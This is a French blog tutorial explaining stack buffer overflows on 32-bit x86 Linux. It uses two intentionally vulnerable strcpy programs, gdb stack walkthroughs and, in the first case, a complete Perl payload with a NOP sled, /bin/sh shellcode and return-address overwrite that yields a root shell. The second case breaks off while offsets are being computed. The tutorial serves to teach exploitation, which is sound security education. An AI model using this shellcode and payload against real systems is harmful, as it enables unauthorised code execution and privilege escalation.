---
title: Tuto Buffer Overflow
date: 2015-03-04
author: "HackN'Do"
layout: post
permalink: /tuto-buffer-overflow/
image: /assets/uploads/2015/03/groot.jpg
categories:
  - Hacking
  - Software
  - UNIX
---
# Tuto buffer overflow

Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d'exploitation dans ce tuto &#8220;buffer overflow&#8221;:

  1. Cas d'un buffer qui alloue suffisamment d'espace pour contenir un shellcode avant l'adresse de retour sur la pile
  2. Cas d'un buffer trop petit pour contenir un shellcode avant l'adresse de retour sur la pile

## Théorie

Nous avons vu l'utilité de la pile (_stack_) dans les articles précédents. En fin d'article, nous avons évoqué le cas où une fonction avec besoin d'allouer de l'espace sur la pile pour une de ses variables locales, qui était un tableau

<pre class="lang:c">void maFonction(char *uneChaine) {
    char tableau[24];
}</pre>

On obtenait alors le schéma suivant pour représenter la stack :

<p style="text-align: center;">
  <img class="alignnone size-full wp-image-450 " src="http://i2.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f6f98c7a1cb.png?w=640" alt="Représentation de la pile" data-recalc-dims="1" />
</p>

<p style="text-align: left;">
  Très bien. Maintenant, si nous allouons un tableau de caractères à cette variable locale de la manière suivante
</p>

<pre class="lang:c">void maFonction(char *uneChaine) {
    char tableau[24];
    strcpy(tableau, uneChaine);
}</pre>

Alors _uneChaine_ sera copié dans la pile dans l'espace alloué, et ce en partant de l'adresse pointée par ESP puis en descendant dans la pile (donc des adresses basses vers les adresses hautes, ou encore du haut de la pile vers le bas de la pile). Prenons un exemple d'une chaine remplie de A d'une longueur inférieure à 24 octets :

<p style="text-align: center;">
  ![img]({{ site.baseurl }}assets/uploads/2015/03/img_54f6f970487b3.png?w=640" alt="Remplissage de la pile" data-recalc-dims="1)
</p>

<p style="text-align: left;">
  Tout va bien, mais vous vous dites sûrement : Hey, mais si je mets plus de caractères que prévu, il se passe quoi ?
</p>

<img class=" size-full wp-image-452 aligncenter" src="http://i2.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f6fa229ad43.png?w=640" alt="Ecrasement dans la pile" data-recalc-dims="1" />

C'est le drame&#8230; pour le développeur. Mais pour nous, c'est maintenant que nous allons commencer à nous amuser ! Vous avez deviné comment ?

Oui, on a pu écrire sur la valeur de retour que le processeur récupèrera à la fin de la fonction. Dans l'état actuel, à la fin du programme, il va tenter d'aller à l'adresse &#8216;AAAA' qui, en hexadécimal, est 0x41414141. Il y a de fortes chances pour qu'il n'ait pas le droit d'accéder à cette case mémoire, et vous obtiendrez un joli SEGFAULT.

Mais cela veut dire que l'on peut écrire la valeur que l'on veut, donc on peut rediriger le fil d'exécution du programme vers un morceau de code que nous aurons préparé. Ce morceau de code peut par exemple ouvrir un shell.

Alors, à vos claviers, et exploitons ceci &#8230;

## Pratique

Comme promis, nous allons nous intéresser à deux cas pratiques :

## **Cas 1**

<pre class="lang:c ">#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[64];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary \n");
    else func(argv[1]);
    return 0;
}</pre>

Voici un programme qui prend en entrée un argument (qui sera une string, ou plus précisément un tableau de caractères). Cet argument est passé tel quel à la fonction _func_. La fonction _func_ prévoit alors de la place sur la pile en allouant 64 octets. Cet espace est pointé par le pointeur _buffer_. Puis le programme copie le contenu de la chaine de caractère dans ce _buffer_, sans aucune vérification sur la taille, et enfin affiche le contenu de _buffer_.

Très bien compilons-le et testons le :

[shell]hackndo@hackndo:~$ gcc binary.c -o binary
  
hackndo@hackndo:~$ ./binary AAA
  
AAA
  
hackndo@hackndo:~$ ./binary \`perl -e &#8216;print &#8220;A&#8221;x200'\`
  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  
Erreur de segmentation
  
hackndo@hackndo:~$[/shell]

Après compilation, nous avons donc lancé notre programme en lui passant dans un premier temps la chaine de caractères AAA. Le programme nous l'a affichée à l'écran, comme prévu. Dans le second cas, nous avons envoyé 200 fois la lettre &#8216;A'. Le programme nous l'affiche également, mais nous nous retrouvons face à une erreur de segmentation (ou SEG_FAULT). Cela veut dire que nous avons tenté de lire un segment nous n'avions pas le droit de lire (ou écrire quelque part où nous n'avions pas le droit d'écrire).

Tentons de comprendre pourquoi, en suivant pas à pas le fonctionnement du programme lors de son exécution. Voici les instructions assembleur des deux fonctions

<pre class="lang:shell">(gdb) disass main
Dump of assembler code for function main:
0x08048419 <+0>:     push   ebp
0x0804841a <+1>:     mov    ebp,esp
0x0804841c <+3>:     and    esp,0xfffffff0
0x0804841f <+6>:     sub    esp,0x10
0x08048422 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
0x08048426 <+13>:    je     0x8048436 <main+29>
0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
0x0804842f <+22>:    call   0x8048330 <puts@plt>
0x08048434 <+27>:    jmp    0x8048446 <main+45>
0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048439 <+32>:    add    eax,0x4
0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
0x0804843e <+37>:    mov    DWORD PTR [esp],eax
0x08048441 <+40>:    call   0x80483f4 
0x08048446 <+45>:    mov    eax,0x0
0x0804844b <+50>:    leave
0x0804844c <+51>:    ret
End of assembler dump.
(gdb) disass func
Dump of assembler code for function func:
0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     sub    esp,0x58
0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
0x08048401 <+13>:    lea    eax,[ebp-0x3a]
0x08048404 <+16>:    mov    DWORD PTR [esp],eax
0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
0x0804840c <+24>:    lea    eax,[ebp-0x3a]
0x0804840f <+27>:    mov    DWORD PTR [esp],eax
0x08048412 <+30>:    call   0x8048330 <puts@plt>
0x08048417 <+35>:    leave
0x08048418 <+36>:    ret
End of assembler dump.</pre>

La première partie de ce code correspond à la fonction _main_ et la deuxième partie correspond à la fonction _func._ L'appel de la fonction _func_ se fait à l'instruction située à l'adresse 0x08048441 de la fonction _main_. Lorsque nous rentrons dans _func_, la troisième ligne correspond à l'allocation du buffer. 0x58 (88 en décimal) octets sont alloués (ce qui est plus que les 64 octets que nous demandons dans le code car il faut tenir compte de l'alignement des variables en mémoire. C'est un sujet dont nous ne discuterons pas ici, il ferait l'objet d'un article complet). Ensuite, à l'adresse 0x08048407 se trouve l'appel système pour copier le contenu de la variable dans le buffer. L'instruction à l'adresse 0x08048412 fait l'appel à _puts_ qui permet d'afficher un tableau de caractère sur la sortie standard, et enfin nous avons l'instruction de retour à l'adresse 0x08048418.

Pour pouvoir suivre l'exécution du code, nous allons placer des breakpoints à des endroits stratégiques pour que je puisse vous faire comprendre le fonctionnement. Vous comprendrez pourquoi ces endroits sont intéressants, puisqu'à chaque breakpoint je vous expliquerai son apport

<pre class="lang:shell">(gdb) break *0x08048441
Breakpoint 1 at 0x8048441
(gdb) break *0x080483f7
Breakpoint 2 at 0x80483f7
(gdb) break *0x080483fa
Breakpoint 3 at 0x80483fa
(gdb) break *0x0804840c
Breakpoint 4 at 0x804840c
(gdb) break *0x08048418
Breakpoint 5 at 0x8048418</pre>

Le premier breakpoint est placé juste avant l'appel de la fonction _func_ dans _main_. Nous pourrons ainsi regarder comment est fait cet appel notamment comment est empilée l'argument que nous passons au programme.
  
Le deuxième est placé avant la réservation de la mémoire pour le buffer. Nous verrons ici comment la fonction _func_ prépare son stackframe en enregistrant l'ancienne valeur de EBP, et en l'initialisant pour son propre stackframe.
  
Le troisème est placé juste après cette réservation de mémoire, afin de voir comment le processeur réserve de l'espace mémoire pour le buffer.
  
Le quatrième est placé après avoir copié la variable dans le buffer, permettant d'observer comment le buffer se rempli avec l'argument que nous lui avons passé, suite à la fonction strcpy.
  
Le dernier est placé avant de sortir de la fonction, pour qu'on puisse voir que le printf n'a pas de problème pour afficher la chaine de caractères.

C'est parti, il est temps d'exécuter le code. Pour cela, je vais envoyer un argument de longueur 78. Il y a une bonne raison, et vous allez la comprendre au fil de cet exemple.

<pre class="lang:shell">(gdb) run `perl -e 'print "A"x78'`
Starting program: /tmp/hackndo/binary `perl -e 'print "A"x78'`
Breakpoint 1, 0x08048441 in main ()
(gdb) disass main
Dump of assembler code for function main:
   0x08048419 <+0>:    push   ebp
   0x0804841a <+1>:    mov    ebp,esp
   0x0804841c <+3>:    and    esp,0xfffffff0
   0x0804841f <+6>:    sub    esp,0x10
   0x08048422 <+9>:    cmp    DWORD PTR [ebp+0x8],0x2
   0x08048426 <+13>:    je     0x8048436 <main+29>
   0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
   0x0804842f <+22>:    call   0x8048330 <puts@plt>
   0x08048434 <+27>:    jmp    0x8048446 <main+45>
   0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 <+32>:    add    eax,0x4
   0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
   0x0804843e <+37>:    mov    DWORD PTR [esp],eax
=> 0x08048441 <+40>:    call   0x80483f4 
   0x08048446 <+45>:    mov    eax,0x0
   0x0804844b <+50>:    leave
   0x0804844c <+51>:    ret
End of assembler dump.
(gdb) i r $eip $esp $ebp
eip            0x8048441     0x8048441 <main+40>
esp            0xbffffc50    0xbffffc50
ebp            0xbffffc68    0xbffffc68
(gdb) x/xw $esp
0xbffffc50:    0xbffffe35
(gdb) x/s 0xbffffe35
0xbffffe35:     'A'</pre>

Très bien, nous voyons où nous en sommes grâce à la commande _disass main__._ Nous sommes donc juste avant l'appel que _main_ fait à _func_. Donc en toute logique, l'élément qui est sur le dessus de la pile devrait être le pointeur vers la chaine de caractère que nous avons passée en argument. En affichant les différents registres qui nous intéressent par la commande abrégée _info registers_, nous pouvons voir que le sommet de la pile se trouve à l'adresse pointée par ESP, c'est à dire 0xbffffc50. Si nous regardons l'adresse qui est ici, avec la commande x/xw $esp, nous obtenons l'adresse qui pointe vers notre chaine de caractères, 0xbffffe35. Et effectivement, lorsqu'on affiche la String située à cette adresse mémoire, gdb nous renvoie que c'est une répétition de 78 fois le caractère &#8216;A'.

Ayant placé le breakpoint sur l'instruction à l'adresse 0x08048441, elle n'a pas encore été exécutée, mais ça sera la prochaine, ce qui explique pourquoi EIP a pour valeur cette adresse.

Enfin, nous voyons que le début du stackframe de la fonction _main_ est situé à l'adresse contenue dans EBP, c'est à dire 0xbffffc68.

Ok, tout est bon, on passe à la suite !

<pre class="lang:shell">(gdb) continue
Continuing.
Breakpoint 2, 0x080483f7 in func ()
(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
=> 0x080483f7 <+3>:     sub    esp,0x58
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.
(gdb) i r $eip $esp $ebp
eip            0x80483f7    0x80483f7 <func+3>
esp            0xbffffc48    0xbffffc48
ebp            0xbffffc48    0xbffffc48
(gdb) x/4xw $esp
0xbffffc48:    0xbffffc68    0x08048446    0xbffffe35    0xb7ff1380</pre>

Encore une fois, nous pouvons voir où nous en sommes dans l'exécution du programme. Si vous suivez, vous devriez deviner ce qu'il y a au sommet de la pile, et le rôle de la prochaine instruction à être exécutée. Comme nous sommes entrés dans la fonction, le processeur a enregistré le registre EIP qui étaient en cours au moment de l'appel, c'est à dire l'adresse 0x08048446. Ensuite, le début de la fonction voulant avoir son propre stack frame enregistre le début du stack frame de la fonction appelante, à l'aide de l'instruction _push ebp_ puis il initialise le début de son stack frame en copiant la valeur de ESP dans EBP (_mov ebp,esp_). J'ai affiché les valeurs des trois registres, et lorsqu'on affiche les 4 valeurs qui sont au sommet de la stack, on retrouve sans surprise la dernière valeur ajoutée qui est l'ancienne valeur de EBP (que nous avions trouvée avant l'appel de la fonction, c'était la base du stack frame de la fonction _main_), suivie de la sauvegarde de EIP, adresse de l'instruction qui suit le _call_ vers la fonction _func_.

A la suite !

<pre class="lang:shell">(gdb) continue
Continuing.
Breakpoint 3, 0x080483fa in func ()</pre>

<pre>(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x58
=> 0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.
(gdb) i r $eip $esp $ebp
eip            0x80483fa    0x80483fa <func+6>
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48
(gdb) x/24xw $esp
0xbffffbf0:    0xb7fffa54    0x00000000    0xb7fe1b48    0x00000001
0xbffffc00:    0x00000000    0x00000001    0xb7fff8f8    0xb7fd6ff4
0xbffffc10:    0xb7f983e9    0xb7ec40f5    0xbffffc28    0xb7eabab5
0xbffffc20:    0xb7fd6ff4    0x0804960c    0xbffffc38    0x080482ec
0xbffffc30:    0xb7ff1380    0x0804960c    0xbffffc68    0x08048479
0xbffffc40:    0xb7fd7324    0xb7fd6ff4    0xbffffc68    0x08048446</pre>

Nous n'avons avancé que d'une instruction, mais elle est très importante. C'est cette instruction qui alloue l'espace requis pour le buffer, ainsi que pour les variables qu'il aura besoin d'ajouter à la pile, telle que l'adresse de notre chaine de caractère qui va être passée à l'appel système _strcpy_. L'instruction assembleur retire 0x58 (soit 88) octets à l'adresse contenue dans ESP. En d'autres termes, elle décale le sommet de la pile et la fait grossir de 88 octets.

A la ligne +6, l'instruction cherche l'adresse qui est à l'adresse EBP+8, puis assigne le contenu pointé par cette adresse à EAX. Nous savons que EBP pointe sur la base du stack frame de la fonction. Donc EBP+4 est la sauvegarde de EIP, et EBP+8 est l'adresse du pointeur sur notre chaine de caractère. Donc EAX va contenir l'adresse de notre chaine de caractère.

La ligne suivante, +9, copie le contenu de EAX (donc l'adresse de notre chaine de caractère), dans ESP+4, c'est à dire dans la case mémoire juste avant le sommet de la pile.

Enfin, les instructions aux lignes +13 et +16 mettent sur le sommet de la pile l'adresse du début de buffer, qui se trouve à EBP &#8211; 0x48. Le buffer qui sera alloué a alors une taille de EBP &#8211; (EBP &#8211; 0x48) = 0x48 octets (donc 72 octets)

Ce qu'il y a des ces 72 octets n'a pas d'importance puisqu'ils ne seront pas lus tant que le buffer n'aura pas été rempli par un contenu.

Vous avez suivi ? Allez, comme je suis sympa, je me suis fendu d'un beau schéma pour comprendre l'état de la pile juste avant d'appeler _strcpy_

<p style="text-align: center;">
  <img class="alignnone size-full wp-image-498 " src="http://i1.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f8601bb6166.png?w=640" alt="Récapitulation de la pile" data-recalc-dims="1" />
</p>

<p style="text-align: left;">
  C'est un peu plus clair ? Essayez de reprendre mes explications avec ce schéma en tête, ça sera surement plus facile de revenir une deuxième fois dessus.
</p>

Un peu de mathématiques font que nous avons finalement un décalage total de 88 octets, ce qui signifie qu'il y un décalage de 22 _quadri-octets_ appelés _word_ (taille d'une adresse). Donc si nous avons un décalage de 22 words, et que nous affichons les 24 premiers éléments de la pile, nous devrions retomber sur nos pattes et trouver en dernières positions notre sauvegarde de EBP et EIP. Et si vous regardez bien, c'est le cas ! La fin de la dernière ligne contient bien les deux adresses escomptées. Les 72 octets qui précèdent sont prévus pour le buffer, et les 16 premiers pour l'appel à strcpy.

<pre class="lang:shell">(gdb) continue
Continuing.

Breakpoint 4, 0x0804840c in func ()
(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x58
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
=> 0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.
(gdb) i r $eip $esp $ebp
eip            0x804840c    0x804840c <func+24>
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48
(gdb) x/24xw $esp
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141</pre>

Nous continuons donc, et nous breakons sur l'instruction qui suit l'appel système strcpy, qui copie le contenu de la variable que nous avons passée en argument (les &#8216;A') dans le buffer.

Comme on le voit sur la pile, les deux premiers éléments sont les deux paramètres que nous avons passés à strcpy. 0xbffffc00 est l'adresse de début de buffer, qui est bien le commencement des 0x41, et le deuxième est l'adresse de notre chaine de caractère en mémoire, comme nous l'avons vu au début.

Mais rappelez-vous, nous n'avions prévu qu'un buffer de 64 octets, et nous lui en avons passés 78 ! Il risque d'y avoir problème. On examine alors le haut de la pile comme au breakpoint précédent, et nous remarquons que tout l'espace alloué pour le buffer a été rempli &#8230; et qu'il a même débordé ! La sauvegarde de EBP a été écrasée par nos &#8216;A' (représenté par leur valeur 0x41 ASCII), et notre enregistrement de EIP a été partiellement réécrit. Il est devenu 0x08004141. Comme la notation est en Little Endian, les cases mémoire sont en fait : 0x41 0x41 0x00 0x08. Donc nous avons les deux derniers &#8216;A' de notre variable, suivit de l'octet nul qui marque la fin d'une chaine de caractère.

Si ce débordement de buffer (buffer overflow) ne dérange pas le processeur dans l'immédiat, il va se trouver embêter lorsqu'il devra réutiliser la valeur sauvegardée de EIP pour pouvoir reprendre le cours de son exécution.

<pre class="lang:shell">(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 5, 0x08048418 in func ()
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
</pre>

Et voilà. Le processeur a bien voulu afficher la chaine dans son intégralité en s'arrêtant au caractère nul, mais lorsqu'il a voulu réutiliser la version sauvegardée de EIP, il est tombé sur l'adresse 0x08004141. Et malheureusement, il n'a pas le droit d'accéder à cette adresse mémoire. Le SEG FAULT est inévitable !

Comme nous l'avons dit dans la partie théorique, nous pouvons réécrire la valeur enregistrée de EIP pour pouvoir rediriger le fil d'exécution du programme. Mais où rediriger cette exécution ? Et bien vers le début d'un shellcode. Un shellcode est une chaine de caractères qui représente une suite d'instructions qui, en s'exécutant, ouvrira un shell. (Le terme shellcode est devenu un peu plus générique, puisque qu'il désigne maintenant n'importe quelle chaine d'instruction écrite dans un but malicieux.)

Nous pourrions décrire ici comment écrire un shellcode, mais ce n'est pas le but de cet article. Des notions plus avancées d'assembleur sont nécessaires et si nous voulions faire le tour du sujet, un article ne suffirait pas. C'est pourquoi nous allons prendre un shellcode tout fait, disponible sur internet, fonctionnant pour une architecture x86 :

> \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

Rapidement, cette suite d'instruction exécute l'appel système &#8220;execve&#8221; en lui passant comme argument la chaine de caractères &#8220;/bin/sh&#8221;, puis fait un appel à l'appel système &#8220;exit&#8221;.

Il s'agit donc de faire exécuter cette suite d'instructions au programme. Le nombre d'octets nécessaires pour stocker cette suite est de 45 octets (38 caractères sous la forme \x?? et les 7 caractères imprimables &#8216;/', &#8216;b', &#8216;i', &#8216;n', &#8216;/', &#8216;s', &#8216;h'.

Et voici comment placer tout cela :

<p style="text-align: center;">
  ![img]({{ site.baseurl }}assets/uploads/2015/03/img_54f78559832ab.png?w=640" alt="Organisation de la pile pour le shellcode" data-recalc-dims="1)
</p>

Nous avons ici une représentation horizontale de la pile. A gauche, nous avons le sommet de la pile, et plus nous allons à droite, plus nous descendons dans la pile. Lorsque strcpy écrit dans le buffer, il écrit de gauche à droite, jusqu'à remplacer la sauvegarde de EBP puis de EIP.

  * Il s'agit alors de remplir une **première partie** du buffer avec l'instruction \x90. En assembleur, cette instruction veut dire &#8220;ne fait rien avec moi, passe à l'instruction suivante&#8221;. C'est l'instruction NOP (No OPeration).
  * La **seconde partie** du buffer contient le shellcode, que nous voulons que le programme exécute.
  * La **troisième partie** contient l'adresse que l'on contrôle.

Nous allons alors faire en sorte que le programme tombe dans la première partie, le pool de NOP. En effet, si on tombe au milieu des NOP, alors le programme va aller à l'instruction suivante, qui est un NOP, puis la suivante etc. jusqu'à arriver au début du shellcode, et va l'exécuter dans son intégralité.

Pour connaitre le nombre de NOP, il faut faire un petit calcul :

Nous avons vu précédemment que la taille du buffer alloué pour strcpy était de 72 octets. Mais pour écraser la sauvegarde de EIP, nous devons d'abord écraser la sauvegarde de EBP, donc 4 octets de plus, ce qui font 76 octets. Cela veut dire que si on écrit 76 octets, alors on aura tout écrasé jusqu'à EIP, EIP non inclus. Si on en écrit deux de plus (78, comme dans l'exemple), alors deux octets de EIP seront écrasés (enfin 3, si on prend le caractère nul de fin de chaine). J'avais fait ce travail en amont pour l'exemple, c'est pourquoi j'avais choisi 78 octets !

Ces caractères doivent se finir par le shellcode (ce n'est pas obligatoire, mais c'est le plus pratique !). Or nous avons dit que le shellcode comptait 45 octets. Ainsi, nous devons insérer 76 &#8211; 45 = 31 NOP, donc 31 fois la valeur \x90.

Enfin, pour trouver l'adresse qui écrasera la sauvegarde de EIP, rappelons-nous l'état de la _stack_ :

<pre class="lang:shell">(gdb) x/24xw $esp
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141</pre>

Les NOPS seront donc entre l'adresse 0xbffffc00 et 0xbffffc00 + 31 = 0xbffffc1f. Pour être sûr de tomber dedans, prenons l'adresse 0xbffffc10

Finalement, nous allons envoyer :

  * 31 x NOP
  * Shellcode
  * 0xbffffc10

Nous ponvous écrire cela en Perl de la manière suivante (en n'oubliant pas, pour l'adresse, la notation Little Endian)

perl -e &#8216;print &#8220;\x90&#8243;x31 . &#8220;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&#8221; . &#8220;\x10\xfc\xff\xbf&#8221;&#8216;

En le lançant dans gdb, on obtient alors le résultat suivant :

<pre class="lang:shell">(gdb) run `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
Starting program: /tmp/hackndo/binary `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
��������������������������������^�1�F�F
                                       �
                                        ���V
                                             ̀1ۉ�@̀�����/bin/sh���
process 20353 is executing new program: /bin/dash
$whoami
root
$</pre>

<p style="text-align: center;">
  <strong>I AM (G)ROOT !</strong>
</p>

<p style="text-align: left;">
  Vous avez suivi jusque là ? Bien joué !
</p>

* * *

<h2 style="text-align: left;">
  Cas 2
</h2>

<pre class="lang:c">#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[8];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary \n");
    else func(argv[1]);
    return 0;
}</pre>

Ce programme est presque similaire au programme précédant, cependant cette fois-ci la taille allouée au buffer n'est que de 8 octets. A cause de cela, l'espace n'est plus suffisant pour pouvoir y injecter notre shellcode.

Pour en être sûr, étudions le nouveau code assembleur associé à ce programme

<pre class="lang:shell">(gdb) disass main
Dump of assembler code for function main:
   0x08048419 <+0>:     push   ebp
   0x0804841a <+1>:     mov    ebp,esp
   0x0804841c <+3>:     and    esp,0xfffffff0
   0x0804841f <+6>:     sub    esp,0x10
   0x08048422 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
   0x08048426 <+13>:    je     0x8048436 <main+29>
   0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
   0x0804842f <+22>:    call   0x8048330 <puts@plt>
   0x08048434 <+27>:    jmp    0x8048446 <main+45>
   0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 <+32>:    add    eax,0x4
   0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
   0x0804843e <+37>:    mov    DWORD PTR [esp],eax
   0x08048441 <+40>:    call   0x80483f4 
   0x08048446 <+45>:    mov    eax,0x0
   0x0804844b <+50>:    leave
   0x0804844c <+51>:    ret
End of assembler dump.
(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x28
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x10]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x10]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.
(gdb)</pre>

C'est exactement le même que celui du cas 1, sauf que cette fois-ci, dans le code assembleur de _func_, on remarque que l'espace réellement alloué pour notre buffer est de 0x10 (16) octets. Notre shellcode étant composé de 45 octets, nous ne pourrons pas l'injecter ici.

Le plus simple est alors de faire exactement la même démarche que pour le premier cas, sauf que nous injecterons notre shellcode **après** la sauvegarde de EIP, comme le montre le schéma suivant :

<img class="alignnone size-full wp-image-472 " src="http://i2.wp.com/blog.hackndo.com/assets/uploads/2015/03/img_54f78478da290.png?w=640" alt="Organisation de la pile pour le shellcode après EIP" data-recalc-dims="1" />

Le pool de NOP (\x90) n'est là que pour &#8220;assurer&#8221; le coup, il n'est pas nécessaire. Viser une plage de 200 NOP est plus simple que viser l'adresse exacte de début de shellcode. Cependant, nous allons tout de même le faire sans, sinon ça serait trop simple !

Les premières étapes du cas 1 sont toujours valables. Refaisons notre petit calcul. On voit dans les instructions assembleur que 0x10 octets (donc 16) sont réservés pour le buffer pour strcpy. Si nous ajoutons la taille de EBP, cela fait 20 octets. On peut vérifier ce calcul simplement en envoyant une chaine de 22 caractères, et en vérifiant que EIP a été écrasé à moitié :

<pre class="lang:shell">(gdb) run `perl -e 'print "A"x22'`
Starting program: /tmp/hackndo/binary `perl -e 'print "A"x22'`
AAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)</pre>

